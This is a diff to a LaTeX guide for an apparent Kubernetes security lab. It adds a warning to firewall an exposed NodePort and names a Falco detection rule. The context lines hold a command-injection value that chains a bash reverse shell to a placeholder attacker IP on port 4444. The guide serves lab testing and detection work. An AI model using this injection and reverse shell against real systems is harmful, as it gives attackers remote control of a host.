@@ -19,6 +19,9 @@ replaced by that listener's address:
 \begin{lstlisting}[language=bash]
 127.0.0.1; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
 \end{lstlisting}
+NodePort 32080 is reachable on every node address, not only from the lab host.
+Restrict it with a host firewall before deploying the target, so that the
+vulnerable form cannot be reached from any other network.
 The relevant Falco rule is named exactly
 \texttt{Redirect STDOUT/STDIN to Network Connection in Container}. The handler
 matches the JSON rule name, not an abbreviated human-readable log message. Record
